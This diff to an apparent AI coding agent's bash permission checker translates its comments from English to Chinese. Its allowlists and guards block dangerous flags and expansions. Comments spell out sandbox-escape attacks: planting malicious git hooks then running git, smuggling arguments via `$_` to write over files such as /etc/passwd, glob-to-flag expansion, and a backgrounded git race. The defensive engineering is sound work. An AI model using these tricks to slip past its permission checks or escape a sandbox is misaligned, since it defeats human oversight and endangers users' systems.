-  // env and printenv removed - could expose sensitive environment variables
+  // env 和 printenv 已移除 — 可能暴露敏感环境变量
 
-  // Development tools version checking - exact match only, no suffix allowed.
-  // SECURITY: `node -v --run <task>` would execute package.json scripts because
-  // Node processes --run before -v. Python/python3 --version are also anchored
-  // for defense-in-depth. These were previously in EXTERNAL_READONLY_COMMANDS which
-  // flows through makeRegexForSafeCommand and permits arbitrary suffixes.
+  // 开发工具版本检查 — 仅精确匹配，不允许后缀。
+  // 安全：`node -v --run <task>` 会执行 package.json 脚本，因为
+  // Node 在 -v 之前处理 --run。Python/python3 --version 也进行了锚定
+  // 以实现深度防御。这些此前在 EXTERNAL_READONLY_COMMANDS 中，
+  // 通过 makeRegexForSafeCommand 处理并允许任意后缀。
   /^node -v$/,
   /^node --version$/,
   /^python --version$/,
   /^python3 --version$/,
 
-  // Misc. safe commands
-  // tree command moved to COMMAND_ALLOWLIST for proper flag validation (blocks -o/--output)
-  /^history(?:\s+\d+)?\s*$/, // Only allow bare history or history with numeric argument - prevents file writing
+  // 其他安全命令
+  // tree 命令已移至 COMMAND_ALLOWLIST 进行适当的标志验证（阻止 -o/--output）
+  /^history(?:\s+\d+)?\s*$/, // 仅允许裸 history 或带数字参数的 history — 防止文件写入
   /^alias$/,
-  /^arch(?:\s+(?:--help|-h))?\s*$/, // Only allow arch with help flags or no arguments
+  /^arch(?:\s+(?:--help|-h))?\s*$/, // 仅允许 arch 带帮助标志或无参数
 
-  // Network commands - only allow exact commands with no arguments to prevent network manipulation
-  /^ip addr$/, // Only allow "ip addr" with no additional arguments
-  /^ifconfig(?:\s+[a-zA-Z][a-zA-Z0-9_-]*)?\s*$/, // Allow ifconfig with interface name only (must start with letter)
+  // 网络命令 — 仅允许无参数的确切命令以防止网络操作
+  /^ip addr$/, // 仅允许 "ip addr" 无额外参数
+  /^ifconfig(?:\s+[a-zA-Z][a-zA-Z0-9_-]*)?\s*$/, // 仅允许 ifconfig 带接口名称（必须以字母开头）
 
-  // JSON processing with jq - allow with inline filters and file arguments
-  // File arguments are validated separately by pathValidation.ts
-  // Allow pipes and complex expressions within quotes but prevent dangerous flags
-  // Block command substitution - backticks are dangerous even in single quotes for jq
-  // Block -f/--from-file, --rawfile, --slurpfile (read files into jq), --run-tests, -L/--library-path (load executable modules)
-  // Block 'env' builtin and '$ENV' object which can access environment variables (defense in depth)
+  // 使用 jq 进行 JSON 处理 — 允许内联过滤器和文件参数
+  // 文件参数由 pathValidation.ts 单独验证
+  // 允许引号内的管道和复杂表达式，但阻止危险标志
+  // 阻止命令替换 — 反引号即使在 jq 的单引号中也是危险的
+  // 阻止 -f/--from-file、--rawfile、--slurpfile（将文件读入 jq）、--run-tests、-L/--library-path（加载可执行模块）
+  // 阻止 'env' 内置和 '$ENV' 对象（可访问环境变量，深度防御）
   /^jq(?!\s+.*(?:-f\b|--from-file|--rawfile|--slurpfile|--run-tests|-L\b|--library-path|\benv\b|\$ENV\b))(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?))*(?:\s+'[^'`]*'|\s+"[^"`]*"|\s+[^-\s'"][^\s]*)+\s*$/,
 
-  // Path commands (path validation ensures they're allowed)
-  // cd command - allows changing to directories
+  // 路径命令（路径验证确保它们被允许）
+  // cd 命令 — 允许更改目录
   /^cd(?:\s+(?:'[^']*'|"[^"]*"|[^\s;|&`$(){}><#\\]+))?$/,
-  // ls command - allows listing directories
+  // ls 命令 — 允许列出目录
   /^ls(?:\s+[^<>()$`|{}&;\n\r]*)?$/,
-  // find command - blocks dangerous flags
-  // Allow escaped parentheses \( and \) for grouping, but block unescaped ones
-  // NOTE: \\[()] must come BEFORE the character class to ensure \( is matched as an escaped paren,
-  // not as backslash + paren (which would fail since paren is excluded from the character class)
+  // find 命令 — 阻止危险标志
+  // 允许转义括号 \( 和 \) 用于分组，但阻止未转义的括号
+  // 注意：\\[()] 必须放在字符类之前，以确保 \( 被匹配为转义括号，
+  // 而不是反斜杠 + 括号（由于括号被排除在字符类外将导致失败）
   /^find(?:\s+(?:\\[()]|(?!-delete\b|-exec\b|-execdir\b|-ok\b|-okdir\b|-fprint0?\b|-fls\b|-fprintf\b)[^<>()$`|{}&;\n\r\s]|\s)+)?$/,
 ])
 
 /**
- * Checks if a command contains glob characters (?, *, [, ]) or expandable `$`
- * variables OUTSIDE the quote contexts where bash would treat them as literal.
- * These could expand to bypass our regex-based security checks.
+ * 检查命令是否包含在 bash 视为字面量的引号上下文之外的通配符（?, *, [, ]）
+ * 或可展开的 `$` 变量。这些可能展开以绕过我们基于正则的安全检查。
  *
- * Glob examples:
- * - `python *` could expand to `python --help` if a file named `--help` exists
- * - `find ./ -?xec` could expand to `find ./ -exec` if such a file exists
- * Globs are literal inside BOTH single and double quotes.
+ * 通配符示例：
+ * - `python *` 如果存在名为 `--help` 的文件，可能展开为 `python --help`
+ * - `find ./ -?xec` 如果存在此类文件，可能展开为 `find ./ -exec`
+ * 通配符在单引号和双引号内部都是字面量。
  *
- * Variable expansion examples:
- * - `uniq --skip-chars=0$_` → `$_` expands to last arg of previous command;
- *   with IFS word splitting, this smuggles positional args past "flags-only"
- *   regexes. `echo " /etc/passwd /tmp/x"; uniq --skip-chars=0$_` → FILE WRITE.
- * - `cd "$HOME"` → double-quoted `$HOME` expands at runtime.
- * Variables are literal ONLY inside single quotes; they expand inside double
- * quotes and unquoted.
+ * 变量展开示例：
+ * - `uniq --skip-chars=0$_` → `$_` 展开为上一个命令的最后一个参数；
+ *   通过 IFS 单词分割，将位置参数偷渡绕过"仅标志"正则表达式。
+ *   `echo " /etc/passwd /tmp/x"; uniq --skip-chars=0$_` → 文件写入。
+ * - `cd "$HOME"` → 双引号内的 `$HOME` 在运行时展开。
+ * 变量仅在单引号内是字面量；在双引号内和未引号的情况下会展开。
  *
- * The `$` check guards the READONLY_COMMAND_REGEXES fallback path. The `$`
- * token check in isCommandSafeViaFlagParsing only covers COMMAND_ALLOWLIST
- * commands; hand-written regexes like uniq's `\S+` and cd's `"[^"]*"` allow `$`.
- * Matches `$` followed by `[A-Za-z_@*#?!$0-9-]` covering `$VAR`, `$_`, `$@`,
- * `$*`, `$#`, `$?`, `$!`, `$$`, `$-`, `$0`-`$9`. Does NOT match `${` or `$(` —
- * those are caught by COMMAND_SUBSTITUTION_PATTERNS in bashSecurity.ts.
+ * `$` 检查守卫 READONLY_COMMAND_REGEXES 回退路径。isCommandSafeViaFlagParsing
+ * 中的 `$` 令牌检查仅覆盖 COMMAND_ALLOWLIST 命令；
+ * 手写正则表达式如 uniq 的 `\S+` 和 cd 的 `"[^"]*"` 允许 `$`。
+ * 匹配 `$` 后跟 `[A-Za-z_@*#?!$0-9-]`，覆盖 `$VAR`、`$_`、`$@`、
+ * `$*`、`$#`、`$?`、`$!`、`$$`、`$-`、`$0`-`$9`。不匹配 `${` 或 `$(` —
+ * 这些由 bashSecurity.ts 中的 COMMAND_SUBSTITUTION_PATTERNS 捕获。
  *
- * @param command The command string to check
- * @returns true if the command contains unquoted glob or expandable `$`
+ * @param command 要检查的命令字符串
+ * @returns 如果命令包含未引用的通配符或可展开的 `$`，则返回 true
  */
 function containsUnquotedExpansion(command: string): boolean {
-  // Track quote state to avoid false positives for patterns inside quoted strings
+  // 跟踪引号状态，避免对引号字符串内部的模式产生误报
   let inSingleQuote = false
   let inDoubleQuote = false
   let escaped = false
@@ -1606,29 +1600,29 @@ function containsUnquotedExpansion(command: string): boolean {
   for (let i = 0; i < command.length; i++) {
     const currentChar = command[i]
 
-    // Handle escape sequences
+    // 处理转义序列
     if (escaped) {
       escaped = false
       continue
     }
 
-    // SECURITY: Only treat backslash as escape OUTSIDE single quotes. In bash,
-    // `\` inside `'...'` is LITERAL — it does not escape the next character.
-    // Without this guard, `'\'` desyncs the quote tracker: the `\` sets
-    // escaped=true, then the closing `'` is consumed by the escaped-skip
-    // instead of toggling inSingleQuote. Parser stays in single-quote
-    // mode for the rest of the command, missing ALL subsequent expansions.
-    // Example: `ls '\' *` — bash sees glob `*`, but desynced parser thinks
-    // `*` is inside quotes → returns false (glob NOT detected).
-    // Defense-in-depth: hasShellQuoteSingleQuoteBug catches `'\'` patterns
-    // before this function is reached, but we fix the tracker anyway for
-    // consistency with the correct implementations in bashSecurity.ts.
+    // 安全：仅在单引号外部将反斜杠视为转义。在 bash 中，
+    // `'...'` 内部的 `\` 是字面量 — 它不会转义下一个字符。
+    // 没有此保护，`'\'` 会使引号跟踪器不同步：`\` 设置
+    // escaped=true，然后闭合的 `'` 被转义跳过消耗，
+    // 而不是切换 inSingleQuote。解析器在命令的其余部分
+    // 保持在单引号模式，从而遗漏所有后续的展开。
+    // 示例：`ls '\' *` — bash 看到通配符 `*`，但不同步的解析器认为
+    // `*` 在引号内 → 返回 false（未检测到通配符）。
+    // 深度防御：hasShellQuoteSingleQuoteBug 在到达此函数之前
+    // 捕获 `'\'` 模式，但我们仍修复跟踪器以与 bashSecurity.ts 中
+    // 的正确实现保持一致。
     if (currentChar === '\\' && !inSingleQuote) {
       escaped = true
       continue
     }
 
-    // Update quote state
+    // 更新引号状态
     if (currentChar === "'" && !inDoubleQuote) {
       inSingleQuote = !inSingleQuote
       continue
@@ -1639,13 +1633,13 @@ function containsUnquotedExpansion(command: string): boolean {
       continue
     }
 
-    // Inside single quotes: everything is literal. Skip.
+    // 在单引号内部：一切都是字面量。跳过。
     if (inSingleQuote) {
       continue
     }
 
-    // Check `$` followed by variable-name or special-parameter character.
-    // `$` expands inside double quotes AND unquoted (only SQ makes it literal).
+    // 检查 `$` 后跟变量名或特殊参数字符。
+    // `$` 在双引号内部和未引号情况下都会展开（只有单引号使其为字面量）。
     if (currentChar === '$') {
       const next = command[i + 1]
       if (next && /[A-Za-z_@*#?!$0-9-]/.test(next)) {
@@ -1653,13 +1647,13 @@ function containsUnquotedExpansion(command: string): boolean {
       }
     }
 
-    // Globs are literal inside double quotes too. Only check unquoted.
+    // 通配符在双引号内部也是字面量。仅检查未引号的情况。
     if (inDoubleQuote) {
       continue
     }
 
-    // Check for glob characters outside all quotes.
-    // These could expand to anything, including dangerous flags.
+    // 检查所有引号外部的通配符字符。
+    // 这些可能展开为任何内容，包括危险标志。
     if (currentChar && /[?*[\]]/.test(currentChar)) {
       return true
     }
@@ -1669,66 +1663,66 @@ function containsUnquotedExpansion(command: string): boolean {
 }
 
 /**
- * Checks if a single command string is read-only based on READONLY_COMMAND_REGEXES.
- * Internal helper function that validates individual commands.
+ * 基于 READONLY_COMMAND_REGEXES 检查单个命令字符串是否为只读。
+ * 验证单个命令的内部辅助函数。
  *
- * @param command The command string to check
- * @returns true if the command is read-only
+ * @param command 要检查的命令字符串
+ * @returns 如果命令是只读的，则返回 true
  */
 function isCommandReadOnly(command: string): boolean {
-  // Handle common stderr-to-stdout redirection pattern
-  // This handles both "command 2>&1" at the end of a full command
-  // and "command 2>&1" as part of a pipeline component
+  // 处理常见的 stderr 到 stdout 重定向模式
+  // 此处理同时涵盖完整命令末尾的 "command 2>&1"
+  // 以及管道组件中的 "command 2>&1"
   let testCommand = command.trim()
   if (testCommand.endsWith(' 2>&1')) {
-    // Remove the stderr redirection for pattern matching
+    // 移除 stderr 重定向以进行模式匹配
     testCommand = testCommand.slice(0, -5).trim()
   }
 
-  // Check for Windows UNC paths that could be vulnerable to WebDAV attacks
-  // Do this early to prevent any command with UNC paths from being marked as read-only
+  // 检查可能易受 WebDAV 攻击的 Windows UNC 路径
+  // 尽早执行此检查，防止任何带有 UNC 路径的命令被标记为只读
   if (containsVulnerableUncPath(testCommand)) {
     return false
   }
 
-  // Check for unquoted glob characters and expandable `$` variables that could
-  // bypass our regex-based security checks. We can't know what these expand to
-  // at runtime, so we can't verify the command is read-only.
+  // 检查未引用的通配符和可展开的 `$` 变量，这些可能
+  // 绕过我们基于正则的安全检查。我们无法知道它们在运行时
+  // 展开为什么，因此无法验证命令是只读的。
   //
-  // Globs: `python *` could expand to `python --help` if such a file exists.
+  // 通配符：`python *` 如果存在此类文件，可能展开为 `python --help`。
   //
-  // Variables: `uniq --skip-chars=0$_` — bash expands `$_` at runtime to the
-  // last arg of the previous command. With IFS word splitting, this smuggles
-  // positional args past "flags-only" regexes like uniq's `\S+`. The `$` token
-  // check inside isCommandSafeViaFlagParsing only covers COMMAND_ALLOWLIST
-  // commands; hand-written regexes in READONLY_COMMAND_REGEXES (uniq, jq, cd)
-  // have no such guard. See containsUnquotedExpansion for full analysis.
+  // 变量：`uniq --skip-chars=0$_` — bash 在运行时将 `$_` 展开为
+  // 上一个命令的最后一个参数。通过 IFS 单词分割，这将位置参数
+  // 偷渡绕过"仅标志"正则表达式（如 uniq 的 `\S+`）。isCommandSafeViaFlagParsing
+  // 中的 `$` 令牌检查仅覆盖 COMMAND_ALLOWLIST 命令；
+  // READONLY_COMMAND_REGEXES 中的手写正则表达式（uniq、jq、cd）
+  // 没有此类保护。详见 containsUnquotedExpansion 的完整分析。
   if (containsUnquotedExpansion(testCommand)) {
     return false
   }
 
-  // Tools like git allow `--upload-pack=cmd` to be abbreviated as `--up=cmd`
-  // Regex filters can be bypassed, so we use strict allowlist validation instead.
-  // This requires defining a set of known safe flags. Claude can help with this,
-  // but please look over it to ensure it didn't add any flags that allow file writes
-  // code execution, or network requests.
+  // 像 git 这样的工具允许将 `--upload-pack=cmd` 缩写为 `--up=cmd`。
+  // 正则过滤器可能被绕过，因此我们改用严格的允许列表验证。
+  // 这需要定义一组已知的安全标志。Claude 可以帮助处理此问题，
+  // 但请仔细检查以确保没有添加任何允许文件写入、代码执行
+  // 或网络请求的标志。
   if (isCommandSafeViaFlagParsing(testCommand)) {
     return true
   }
 
   for (const regex of READONLY_COMMAND_REGEXES) {
     if (regex.test(testCommand)) {
-      // Prevent git commands with -c flag to avoid config options that can lead to code execution
-      // The -c flag allows setting arbitrary git config values inline, including dangerous ones like
-      // core.fsmonitor, diff.external, core.gitProxy, etc. that can execute arbitrary commands
-      // Check for -c preceded by whitespace and followed by whitespace or equals
-      // Using regex to catch spaces, tabs, and other whitespace (not part of other flags like --cached)
+      // 阻止带 -c 标志的 git 命令，以避免可能导致代码执行的配置选项
+      // -c 标志允许内联设置任意 git 配置值，包括危险的配置如
+      // core.fsmonitor、diff.external、core.gitProxy 等，这些可以执行任意命令
+      // 检查前面有空白、后面跟空白或等号的 -c
+      // 使用正则捕获空格、制表符和其他空白（不是 --cached 等其他标志的一部分）
       if (testCommand.includes('git') && /\s-c[\s=]/.test(testCommand)) {
         return false
       }
 
-      // Prevent git commands with --exec-path flag to avoid path manipulation that can lead to code execution
-      // The --exec-path flag allows overriding the directory where git looks for executables
+      // 阻止带 --exec-path 标志的 git 命令，以避免可能导致代码执行的路径操作
+      // --exec-path 标志允许覆盖 git 查找可执行文件的目录
       if (
         testCommand.includes('git') &&
         /\s--exec-path[\s=]/.test(testCommand)
@@ -1736,9 +1730,9 @@ function isCommandReadOnly(command: string): boolean {
         return false
       }
 
-      // Prevent git commands with --config-env flag to avoid config injection via environment variables
-      // The --config-env flag allows setting git config values from environment variables, which can be
-      // just as dangerous as -c flag (e.g., core.fsmonitor, diff.external, core.gitProxy)
+      // 阻止带 --config-env 标志的 git 命令，以避免通过环境变量进行配置注入
+      // --config-env 标志允许从环境变量设置 git 配置值，这可能
+      // 与 -c 标志同样危险（例如 core.fsmonitor、diff.external、core.gitProxy）
       if (
         testCommand.includes('git') &&
         /\s--config-env[\s=]/.test(testCommand)
@@ -1752,10 +1746,10 @@ function isCommandReadOnly(command: string): boolean {
 }
 
 /**
- * Checks if a compound command contains any git command.
+ * 检查复合命令是否包含任何 git 命令。
  *
- * @param command The full command string to check
- * @returns true if any subcommand is a git command
+ * @param command 要检查的完整命令字符串
+ * @returns 如果有任何子命令是 git 命令，则返回 true
  */
 function commandHasAnyGit(command: string): boolean {
   return splitCommand_DEPRECATED(command).some(subcmd =>
@@ -1764,9 +1758,9 @@ function commandHasAnyGit(command: string): boolean {
 }
 
 /**
- * Git-internal path patterns that can be exploited for sandbox escape.
- * If a command creates these files and then runs git, the git command
- * could execute malicious hooks from the created files.
+ * 可能被利用进行沙箱逃逸的 git 内部路径模式。
+ * 如果命令创建了这些文件然后运行 git，git 命令
+ * 可能从创建的文件中执行恶意钩子。
  */
 const GIT_INTERNAL_PATTERNS = [
   /^HEAD$/,
@@ -1776,21 +1770,21 @@ const GIT_INTERNAL_PATTERNS = [
 ]
 
 /**
- * Checks if a path is a git-internal path (HEAD, objects/, refs/, hooks/).
+ * 检查路径是否为 git 内部路径（HEAD、objects/、refs/、hooks/）。
  */
 function isGitInternalPath(path: string): boolean {
-  // Normalize path by removing leading ./ or /
+  // 通过移除开头的 ./ 或 / 来规范化路径
   const normalized = path.replace(/^\.?\//, '')
   return GIT_INTERNAL_PATTERNS.some(pattern => pattern.test(normalized))
 }
 
-// Commands that only delete or modify in-place (don't create new files at new paths)
+// 仅删除或原地修改的命令（不会在新路径创建新文件）
 const NON_CREATING_WRITE_COMMANDS = new Set(['rm', 'rmdir', 'sed'])
 
 /**
- * Extracts write paths from a subcommand using PATH_EXTRACTORS.
- * Only returns paths for commands that can create new files/directories
- * (write/create operations excluding deletion and in-place modification).
+ * 使用 PATH_EXTRACTORS 从子命令中提取写入路径。
+ * 仅返回可以创建新文件/目录的命令的路径
+ *（写入/创建操作，排除删除和原地修改）。
  */
 function extractWritePathsFromSubcommand(subcommand: string): string[] {
   const parseResult = tryParseShellCommand(subcommand, env => `$${env}`)
@@ -1804,7 +1798,7 @@ function extractWritePathsFromSubcommand(subcommand: string): string[] {
   const baseCmd = tokens[0]
   if (!baseCmd) return []
 
-  // Only consider commands that can create files at target paths
+  // 仅考虑可以在目标路径创建文件的命令
   if (!(baseCmd in COMMAND_OPERATION_TYPE)) {
     return []
   }
@@ -1823,19 +1817,19 @@ function extractWritePathsFromSubcommand(subcommand: string): string[] {
 }
 
 /**
- * Checks if a compound command writes to any git-internal paths.
- * This is used to detect potential sandbox escape attacks where a command
- * creates git-internal files (HEAD, objects/, refs/, hooks/) and then runs git.
+ * 检查复合命令是否写入任何 git 内部路径。
+ * 用于检测可能的沙箱逃逸攻击，其中命令创建 git 内部文件
+ *（HEAD、objects/、refs/、hooks/）然后运行 git。
  *
- * SECURITY: A compound command could bypass the bare repo detection by:
- * 1. Creating bare git repo files (HEAD, objects/, refs/, hooks/) in the same command
- * 2. Then running git, which would execute malicious hooks
+ * 安全：复合命令可能通过以下方式绕过裸仓库检测：
+ * 1. 在同一命令中创建裸 git 仓库文件（HEAD、objects/、refs/、hooks/）
+ * 2. 然后运行 git，这将执行恶意钩子
  *
- * Example attack:
- * mkdir -p objects refs hooks && echo '#!/bin/bash\nmalicious' > hooks/pre-commit && touch HEAD && git status
+ * 攻击示例：
+ * mkdir -p objects refs hooks && echo '#!/bin/bash\n恶意代码' > hooks/pre-commit && touch HEAD && git status
  *
- * @param command The full command string to check
- * @returns true if any subcommand writes to git-internal paths
+ * @param command 要检查的完整命令字符串
+ * @returns 如果有任何子命令写入 git 内部路径，则返回 true
  */
 function commandWritesToGitInternalPaths(command: string): boolean {
   const subcommands = splitCommand_DEPRECATED(command)
@@ -1843,7 +1837,7 @@ function commandWritesToGitInternalPaths(command: string): boolean {
   for (const subcmd of subcommands) {
     const trimmed = subcmd.trim()
 
-    // Check write paths from path-based commands (mkdir, touch, cp, mv)
+    // 检查来自基于路径的命令（mkdir、touch、cp、mv）的写入路径
     const writePaths = extractWritePathsFromSubcommand(trimmed)
     for (const path of writePaths) {
       if (isGitInternalPath(path)) {
@@ -1851,7 +1845,7 @@ function commandWritesToGitInternalPaths(command: string): boolean {
       }
     }
 
-    // Check output redirections (e.g., echo x > hooks/pre-commit)
+    // 检查输出重定向（例如 echo x > hooks/pre-commit）
     const { redirections } = extractOutputRedirections(trimmed)
     for (const { target } of redirections) {
       if (isGitInternalPath(target)) {
@@ -1864,14 +1858,14 @@ function commandWritesToGitInternalPaths(command: string): boolean {
 }
 
 /**
- * Checks read-only constraints for bash commands.
- * This is the single exported function that validates whether a command is read-only.
- * It handles compound commands, sandbox mode, and safety checks.
+ * 检查 bash 命令的只读约束。
+ * 这是验证命令是否为只读的唯一导出函数。
+ * 它处理复合命令、沙箱模式和安全检查。
  *
- * @param input The bash command input to validate
- * @param compoundCommandHasCd Pre-computed flag indicating if any cd command exists in the compound command.
- *                              This is computed by commandHasAnyCd() and passed in to avoid duplicate computation.
- * @returns PermissionResult indicating whether the command is read-only
+ * @param input 要验证的 bash 命令输入
+ * @param compoundCommandHasCd 预计算的标志，指示复合命令中是否存在任何 cd 命令。
+ *                              由 commandHasAnyCd() 计算并传入以避免重复计算。
+ * @returns 指示命令是否为只读的 PermissionResult
  */
 export function checkReadOnlyConstraints(
   input: z.infer<typeof BashTool.inputSchema>,
@@ -1881,59 +1875,59 @@ export function checkReadOnlyConstraints(
   if (!input || typeof input.command !== 'string' || !input.command.trim()) {
     return {
       behavior: 'passthrough',
-      message: 'Command input is empty, requires further permission checks',
+      message: '命令输入为空，需要进一步权限检查',
     }
   }
   const { command } = input
 
-  // Detect if the command is not parseable and return early
+  // 检测命令是否无法解析，如果是则提前返回
   const result = tryParseShellCommand(command, env => `$${env}`)
   if (!result.success) {
     return {
       behavior: 'passthrough',
-      message: 'Command cannot be parsed, requires further permission checks',
+      message: '命令无法解析，需要进一步权限检查',
     }
   }
 
-  // Check the original command for safety before splitting
-  // This is important because splitCommand_DEPRECATED may transform the command
-  // (e.g., ${VAR} becomes $VAR)
+  // 在拆分之前检查原始命令的安全性
+  // 这很重要，因为 splitCommand_DEPRECATED 可能转换命令
+  //（例如 ${VAR} 变为 $VAR）
   if (bashCommandIsSafe_DEPRECATED(command).behavior !== 'passthrough') {
     return {
       behavior: 'passthrough',
-      message: 'Command is not read-only, requires further permission checks',
+      message: '命令不是只读操作，需要进一步权限检查',
     }
   }
 
-  // Check for Windows UNC paths in the original command before transformation
-  // This must be done before splitCommand_DEPRECATED because splitCommand_DEPRECATED may transform backslashes
+  // 在转换之前检查原始命令中的 Windows UNC 路径
+  // 这必须在 splitCommand_DEPRECATED 之前完成，因为 splitCommand_DEPRECATED 可能转换反斜杠
   if (containsVulnerableUncPath(command)) {
     return {
       behavior: 'ask',
       message:
-        'Command contains Windows UNC path that could be vulnerable to WebDAV attacks',
+        '命令包含可能易受 WebDAV 攻击的 Windows UNC 路径',
     }
   }
 
-  // Check once if any subcommand is a git command (used for multiple security checks below)
+  // 检查一次是否有任何子命令是 git 命令（用于下面的多个安全检查）
   const hasGitCommand = commandHasAnyGit(command)
 
-  // SECURITY: Block compound commands that have both cd AND git
-  // This prevents sandbox escape via: cd /malicious/dir && git status
-  // where the malicious directory contains fake git hooks that execute arbitrary code.
+  // 安全：阻止同时包含 cd 和 git 的复合命令
+  // 防止通过以下方式逃逸沙箱：cd /恶意/目录 && git status
+  // 其中恶意目录包含执行任意代码的假 git 钩子。
   if (compoundCommandHasCd && hasGitCommand) {
     return {
       behavior: 'passthrough',
       message:
-        'Compound commands with cd and git require permission checks for enhanced security',
+        '包含 cd 和 git 的复合命令需要权限检查以增强安全性',
     }
   }
 
-  // SECURITY: Block git commands if the current directory looks like a bare/exploited git repo
-  // This prevents sandbox escape when an attacker has:
-  // 1. Deleted .git/HEAD to invalidate the normal git directory
-  // 2. Created hooks/pre-commit or other git-internal files in the current directory
-  // Git would then treat the cwd as the git directory and execute malicious hooks.
+  // 安全：如果当前目录看起来像裸/被利用的 git 仓库，则阻止 git 命令
+  // 当攻击者执行以下操作时，防止沙箱逃逸：
+  // 1. 删除 .git/HEAD 使正常的 git 目录失效
+  // 2. 在当前目录中创建 hooks/pre-commit 或其他 git 内部文件
+  // Git 然后将 cwd 视为 git 目录并执行恶意钩子。
   if (hasGitCommand && isCurrentDirectoryBareGitRepo()) {
     return {
       behavior: 'passthrough',
@@ -1942,24 +1936,23 @@ export function checkReadOnlyConstraints(
     }
   }
 
-  // SECURITY: Block compound commands that write to git-internal paths AND run git
-  // This prevents sandbox escape where a command creates git-internal files
-  // (HEAD, objects/, refs/, hooks/) and then runs git, which would execute
-  // malicious hooks from the newly created files.
-  // Example attack: mkdir -p hooks && echo 'malicious' > hooks/pre-commit && git status
+  // 安全：阻止写入 git 内部路径并运行 git 的复合命令
+  // 防止命令创建 git 内部文件（HEAD、objects/、refs/、hooks/）
+  // 然后运行 git，后者将从新创建的文件执行恶意钩子。
+  // 攻击示例：mkdir -p hooks && echo '恶意代码' > hooks/pre-commit && git status
   if (hasGitCommand && commandWritesToGitInternalPaths(command)) {
     return {
       behavior: 'passthrough',
       message:
-        'Compound commands that create git internal files and run git require permission checks for enhanced security',
+        '创建 git 内部文件并运行 git 的复合命令需要权限检查以增强安全性',
     }
   }
 
-  // SECURITY: Only auto-allow git commands as read-only if we're in the original cwd
-  // (which is protected by sandbox denyWrite) or if sandbox is disabled (attack is moot).
-  // Race condition: a sandboxed command can create bare repo files in a subdirectory,
-  // and a backgrounded git command (e.g. sleep 10 && git status) would pass the
-  // isCurrentDirectoryBareGitRepo() check at evaluation time before the files exist.
+  // 安全：仅当我们在原始 cwd（受沙箱 denyWrite 保护）或沙箱禁用时
+  //（攻击无效），才自动将 git 命令允许为只读。
+  // 竞态条件：沙箱中的命令可以在子目录中创建裸仓库文件，
+  // 而后台运行的 git 命令（例如 sleep 10 && git status）在评估时
+  // 会通过 isCurrentDirectoryBareGitRepo() 检查——此时文件尚未存在。
   if (
     hasGitCommand &&
     SandboxManager.isSandboxingEnabled() &&
@@ -1968,11 +1961,11 @@ export function checkReadOnlyConstraints(
     return {
       behavior: 'passthrough',
       message:
-        'Git commands outside the original working directory require permission checks when sandbox is enabled',
+        '沙箱启用时，原始工作目录之外的 Git 命令需要权限检查',
     }
   }
 
-  // Check if all subcommands are read-only
+  // 检查所有子命令是否都是只读的
   const allSubcommandsReadOnly = splitCommand_DEPRECATED(command).every(
     subcmd => {
       if (bashCommandIsSafe_DEPRECATED(subcmd).behavior !== 'passthrough') {
@@ -1989,9 +1982,9 @@ export function checkReadOnlyConstraints(
     }
   }
 
-  // If not read-only, return passthrough to let other permission checks handle it
+  // 如果不是只读的，返回 passthrough 让其他权限检查处理
   return {
     behavior: 'passthrough',
-    message: 'Command is not read-only, requires further permission checks',
+    message: '命令不是只读操作，需要进一步权限检查',
   }
 }
